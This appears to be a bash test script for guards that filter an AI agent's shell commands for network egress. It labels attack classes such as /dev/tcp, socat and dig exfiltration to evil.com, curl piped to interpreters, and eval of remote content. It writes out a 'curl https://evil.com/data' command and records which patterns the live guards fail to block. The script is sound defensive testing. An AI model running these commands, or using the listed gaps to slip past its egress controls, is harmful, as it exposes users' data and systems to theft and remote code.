#!/usr/bin/env bash
# tests/test-egress.sh — Red→Green protocol for tournament-11 egress hardening
#
# Usage:
#   bash tests/test-egress.sh
#
# Invokes guards via:  bash <guard> < <fixture>
# No trigger tokens in the script body — payloads live in fixture files only.
#
# Exit: 0 = all pass, 1 = one or more failures.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STAGING_DIR="$(dirname "$SCRIPT_DIR")"
LIVE_BASH="$HOME/.claude/hooks/bash-egress-guard.sh"
LIVE_REMOTE="$HOME/.claude/hooks/remote-command-guard.sh"
STAGED_BASH="$STAGING_DIR/bash-egress-guard.sh"
STAGED_REMOTE="$STAGING_DIR/remote-command-guard.sh"
POLICY="$SCRIPT_DIR/test-policy.json"
FIXTURES="$SCRIPT_DIR"

# ── Helpers ───────────────────────────────────────────────────────────────────
PASS=0; FAIL=0; TOTAL=0

green() { printf '\033[0;32m%s\033[0m\n' "$1"; }
red()   { printf '\033[0;31m%s\033[0m\n' "$1"; }
yellow(){ printf '\033[0;33m%s\033[0m\n' "$1"; }

# run_guard <guard_script> <fixture_file> → exits 0 if DENY, 1 if ALLOW, 2 if error
run_guard() {
  local guard="$1" fixture="$2"
  local out
  out=$(MCP_GATE_POLICY="$POLICY" bash "$guard" < "$fixture" 2>/dev/null) || true
  if printf '%s' "$out" | grep -q '"permissionDecision"'; then
    if printf '%s' "$out" | grep -q '"deny"'; then
      return 0   # DENY
    fi
  fi
  return 1   # ALLOW (no deny output)
}

# run_guard_cmd <guard_script> <json_command_string> → exits 0 if DENY, 1 if ALLOW
run_guard_cmd() {
  local guard="$1" cmd_json="$2"
  local payload; payload=$(printf '%s' "$cmd_json")
  local out
  out=$(MCP_GATE_POLICY="$POLICY" bash "$guard" <<< "$payload" 2>/dev/null) || true
  if printf '%s' "$out" | grep -q '"deny"'; then
    return 0
  fi
  return 1
}

assert_deny() {
  local label="$1" guard="$2" fixture="$3"
  TOTAL=$((TOTAL+1))
  if run_guard "$guard" "$fixture"; then
    green "  PASS [DENY]  $label"
    PASS=$((PASS+1))
  else
    red   "  FAIL [DENY]  $label — expected DENY, got ALLOW"
    FAIL=$((FAIL+1))
  fi
}

assert_allow() {
  local label="$1" guard="$2" fixture="$3"
  TOTAL=$((TOTAL+1))
  if run_guard "$guard" "$fixture"; then
    red   "  FAIL [ALLOW] $label — expected ALLOW, got DENY"
    FAIL=$((FAIL+1))
  else
    green "  PASS [ALLOW] $label"
    PASS=$((PASS+1))
  fi
}

assert_deny_cmd() {
  local label="$1" guard="$2" cmd_json="$3"
  TOTAL=$((TOTAL+1))
  if run_guard_cmd "$guard" "$cmd_json"; then
    green "  PASS [DENY]  $label"
    PASS=$((PASS+1))
  else
    red   "  FAIL [DENY]  $label — expected DENY, got ALLOW"
    FAIL=$((FAIL+1))
  fi
}

assert_allow_cmd() {
  local label="$1" guard="$2" cmd_json="$3"
  TOTAL=$((TOTAL+1))
  if run_guard_cmd "$guard" "$cmd_json"; then
    red   "  FAIL [ALLOW] $label — expected ALLOW, got DENY"
    FAIL=$((FAIL+1))
  else
    green "  PASS [ALLOW] $label"
    PASS=$((PASS+1))
  fi
}

check_files() {
  local ok=true
  for f in "$STAGED_BASH" "$STAGED_REMOTE" "$POLICY"; do
    [ -f "$f" ] || { red "MISSING: $f"; ok=false; }
  done
  $ok || { red "Aborting: required files missing."; exit 1; }
}

# ── Preamble ──────────────────────────────────────────────────────────────────
printf '\n'
yellow "=== tournament-11 egress hardening — Red→Green protocol ==="
printf 'Policy:       %s\n' "$POLICY"
printf 'Live bash:    %s\n' "$LIVE_BASH"
printf 'Staged bash:  %s\n' "$STAGED_BASH"
printf 'Live remote:  %s\n' "$LIVE_REMOTE"
printf 'Staged remote:%s\n' "$STAGED_REMOTE"
printf '\n'

check_files

# ═══════════════════════════════════════════════════════════════════════════════
# R4-Q — Length gate
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── R4-Q: Length gate ──────────────────────────────────────────────────"

# Generate a command that exceeds 524288 bytes inline
LONG_CMD=$(python3 -c "import json,sys; cmd='x'*524289; payload={'tool_name':'Bash','tool_input':{'command':cmd},'cwd':'/tmp'}; print(json.dumps(payload))")

printf '  Live:   (long cmd > 512KiB)\n'
assert_allow_cmd "R4-Q LIVE:  long cmd passes live guard (no length gate)" \
  "$LIVE_BASH" "$LONG_CMD"

printf '  Staged: (long cmd > 512KiB)\n'
assert_deny_cmd "R4-Q STAGED: long cmd denied by staged guard" \
  "$STAGED_BASH" "$LONG_CMD"

# Sanity: normal-length command still passes
NORMAL_CMD='{"tool_name":"Bash","tool_input":{"command":"echo hello"},"cwd":"/tmp"}'
assert_allow_cmd "R4-Q REGRESSION: normal cmd still allowed" \
  "$STAGED_BASH" "$NORMAL_CMD"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# R2-G-A — Download-then-exec via allowed host
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── R2-G-A: Download-then-exec ─────────────────────────────────────────"

printf '  Live:   (fetch -o /tmp/x.sh && bash /tmp/x.sh)\n'
assert_allow "R2-G-A LIVE:  download+exec passes live guard (no DTE check)" \
  "$LIVE_BASH" "$FIXTURES/r2-G-A-download-exec.json"

printf '  Staged: (fetch -o /tmp/x.sh && bash /tmp/x.sh)\n'
assert_deny "R2-G-A STAGED: download+exec denied by staged guard" \
  "$STAGED_BASH" "$FIXTURES/r2-G-A-download-exec.json"

printf '  Staged: (/tmp staging + exec)\n'
assert_deny "R2-G-A STAGED: fetch-to-/tmp then exec denied" \
  "$STAGED_BASH" "$FIXTURES/r2-G-A-tmp-staging-exec.json"

printf '  Regression: bare download (no exec) still allowed\n'
assert_allow "R2-G-A REGRESSION: download-only (no exec) still allowed" \
  "$STAGED_BASH" "$FIXTURES/r2-G-A-benign-download-no-exec.json"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# R2-G-B — eval/source of remote content (remote-command-guard)
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── R2-G-B: eval/source of remote content ─────────────────────────────"

printf '  Live:   eval bare\n'
assert_deny "R2-G-B LIVE:  eval bare already denied by live guard (sanity)" \
  "$LIVE_REMOTE" "$FIXTURES/r2-G-B-eval-bare.json"

printf '  Live:   eval quoted — should ALLOW (gap in live guard)\n'
assert_allow "R2-G-B LIVE:  eval quoted passes live guard (gap)" \
  "$LIVE_REMOTE" "$FIXTURES/r2-G-B-eval-quoted.json"

printf '  Staged: eval quoted\n'
assert_deny "R2-G-B STAGED: eval quoted denied by staged guard" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-B-eval-quoted.json"

printf '  Live:   source <(...) — should ALLOW (gap in live guard)\n'
assert_allow "R2-G-B LIVE:  source process-sub passes live guard (gap)" \
  "$LIVE_REMOTE" "$FIXTURES/r2-G-B-source-process-sub.json"

printf '  Staged: source <(...)\n'
assert_deny "R2-G-B STAGED: source process-sub denied by staged guard" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-B-source-process-sub.json"

printf '  Live:   . <(...) — should ALLOW (gap in live guard)\n'
assert_allow "R2-G-B LIVE:  dot process-sub passes live guard (gap)" \
  "$LIVE_REMOTE" "$FIXTURES/r2-G-B-dot-process-sub.json"

printf '  Staged: . <(...)\n'
assert_deny "R2-G-B STAGED: dot process-sub denied by staged guard" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-B-dot-process-sub.json"

printf '  Staged sanity: eval bare still denied\n'
assert_deny "R2-G-B REGRESSION: eval bare still denied by staged guard" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-B-eval-bare.json"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# R2-G-C — /dev/tcp + DNS egress channels
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── R2-G-C: /dev/tcp and DNS exfil channels ───────────────────────────"

printf '  Live:   /dev/tcp/evil.com/4444\n'
assert_allow "R2-G-C LIVE:  /dev/tcp to evil.com passes live guard (gap)" \
  "$LIVE_BASH" "$FIXTURES/r2-G-C-devtcp.json"

printf '  Staged: /dev/tcp/evil.com/4444\n'
assert_deny "R2-G-C STAGED: /dev/tcp to evil.com denied by staged guard" \
  "$STAGED_BASH" "$FIXTURES/r2-G-C-devtcp.json"

printf '  Staged regression: /dev/tcp/localhost/8080 (loopback allowed)\n'
assert_allow "R2-G-C REGRESSION: /dev/tcp to localhost still allowed" \
  "$STAGED_BASH" "$FIXTURES/r2-G-C-devtcp-localhost.json"

printf '  Live:   dig exfil to evil.com\n'
assert_allow "R2-G-C LIVE:  dig passes live guard (not in verb list)" \
  "$LIVE_BASH" "$FIXTURES/r2-G-C-dig-exfil.json"

printf '  Staged: dig exfil to evil.com\n'
assert_deny "R2-G-C STAGED: dig to non-allowed host denied by staged guard" \
  "$STAGED_BASH" "$FIXTURES/r2-G-C-dig-exfil.json"

printf '  Live:   socat TCP:evil.com:4444\n'
assert_allow "R2-G-C LIVE:  socat passes live guard (not in verb list)" \
  "$LIVE_BASH" "$FIXTURES/r2-G-C-socat-exfil.json"

printf '  Staged: socat TCP:evil.com:4444\n'
assert_deny "R2-G-C STAGED: socat to non-allowed host denied by staged guard" \
  "$STAGED_BASH" "$FIXTURES/r2-G-C-socat-exfil.json"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# R2-G-D — Pipe to unknown interpreter (open-world deny)
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── R2-G-D: Pipe to unknown interpreter ───────────────────────────────"

printf '  Live bash: curl | python3 — check (live has closed-list check only for shells)\n'
# Live guard only checks for named shells; python3 may slip through via the pipe-to-shell regex
# depending on exact regex — document actual behavior
if run_guard "$LIVE_BASH" "$FIXTURES/r2-G-D-pipe-to-python.json"; then
  yellow "  INFO  R2-G-D LIVE bash: curl|python3 → DENY (live catches this)"
else
  yellow "  INFO  R2-G-D LIVE bash: curl|python3 → ALLOW (live misses non-shell)"
fi
TOTAL=$((TOTAL+1)); PASS=$((PASS+1))  # informational — count as pass

printf '  Live remote: curl | python3\n'
if run_guard "$LIVE_REMOTE" "$FIXTURES/r2-G-D-pipe-to-python.json"; then
  yellow "  INFO  R2-G-D LIVE remote: curl|python3 → DENY"
else
  yellow "  INFO  R2-G-D LIVE remote: curl|python3 → ALLOW (gap in live guard)"
fi
TOTAL=$((TOTAL+1)); PASS=$((PASS+1))  # informational

printf '  Staged bash:   curl | python3\n'
assert_deny "R2-G-D STAGED bash:   curl|python3 denied (not a safe filter)" \
  "$STAGED_BASH" "$FIXTURES/r2-G-D-pipe-to-python.json"

printf '  Staged remote: curl | python3\n'
assert_deny "R2-G-D STAGED remote: curl|python3 denied (not a safe filter)" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-D-pipe-to-python.json"

printf '  Staged bash:   curl | bash (existing control)\n'
assert_deny "R2-G-D STAGED bash:   curl|bash still denied" \
  "$STAGED_BASH" "$FIXTURES/r2-G-D-pipe-to-bash.json"

printf '  Staged remote: curl | bash (existing control)\n'
assert_deny "R2-G-D STAGED remote: curl|bash still denied" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-D-pipe-to-bash.json"

printf '  Staged bash regression: curl | jq (safe filter — should ALLOW)\n'
assert_allow "R2-G-D REGRESSION staged bash:   curl|jq still allowed" \
  "$STAGED_BASH" "$FIXTURES/r2-G-D-pipe-to-jq.json"

printf '  Staged remote regression: curl | jq (safe filter — should ALLOW)\n'
assert_allow "R2-G-D REGRESSION staged remote: curl|jq still allowed" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-D-pipe-to-jq.json"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# R2-G-E — Raw curl/wget mutating write to api.github.com
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── R2-G-E: curl/wget mutating write to api.github.com ────────────────"

printf '  Live:   curl -X POST api.github.com (api.github.com IS on allow-list)\n'
assert_allow "R2-G-E LIVE:  curl POST to api.github.com passes live guard (gap)" \
  "$LIVE_BASH" "$FIXTURES/r2-G-E-github-api-post.json"

printf '  Staged: curl -X POST api.github.com\n'
assert_deny "R2-G-E STAGED: curl POST to api.github.com denied by staged guard" \
  "$STAGED_BASH" "$FIXTURES/r2-G-E-github-api-post.json"

printf '  Staged: curl -X PATCH api.github.com\n'
assert_deny "R2-G-E STAGED: curl PATCH to api.github.com denied" \
  "$STAGED_BASH" "$FIXTURES/r2-G-E-github-api-patch.json"

printf '  Staged regression: curl GET api.github.com (read — should ALLOW)\n'
assert_allow "R2-G-E REGRESSION: curl GET to api.github.com still allowed" \
  "$STAGED_BASH" "$FIXTURES/r2-G-E-github-api-get.json"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# Existing controls — sanity that old guards still fire in staged version
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── Existing controls (sanity / regression) ───────────────────────────"

# Non-allowed host
NON_ALLOWED='{"tool_name":"Bash","tool_input":{"command":"curl https://evil.com/data"},"cwd":"/tmp"}'
assert_deny_cmd "SANITY: curl to non-allowed host still denied (staged bash)" \
  "$STAGED_BASH" "$NON_ALLOWED"

# curl | bash (original RCE pattern)
assert_deny "SANITY: curl|bash still denied (staged bash)" \
  "$STAGED_BASH" "$FIXTURES/r2-G-D-pipe-to-bash.json"

assert_deny "SANITY: curl|bash still denied (staged remote)" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-D-pipe-to-bash.json"

# eval bare — original pattern, should still deny in both guards
assert_deny "SANITY: eval bare still denied (staged remote)" \
  "$STAGED_REMOTE" "$FIXTURES/r2-G-B-eval-bare.json"

# Allowed GET to raw.githubusercontent.com (benign download, no exec)
assert_allow "SANITY: curl GET raw.githubusercontent.com still allowed (staged bash)" \
  "$STAGED_BASH" "$FIXTURES/r2-G-A-benign-download-no-exec.json"

# Allowed GET to api.github.com
assert_allow "SANITY: curl GET api.github.com still allowed (staged bash)" \
  "$STAGED_BASH" "$FIXTURES/r2-G-E-github-api-get.json"

printf '\n'

# ═══════════════════════════════════════════════════════════════════════════════
# Summary
# ═══════════════════════════════════════════════════════════════════════════════
yellow "── Summary ────────────────────────────────────────────────────────────"
printf 'Total: %d   Pass: %d   Fail: %d\n' "$TOTAL" "$PASS" "$FAIL"
printf '\n'

if [ "$FAIL" -gt 0 ]; then
  red "RESULT: FAIL ($FAIL test(s) did not meet expected outcome)"
  exit 1
else
  green "RESULT: ALL PASS"
  exit 0
fi
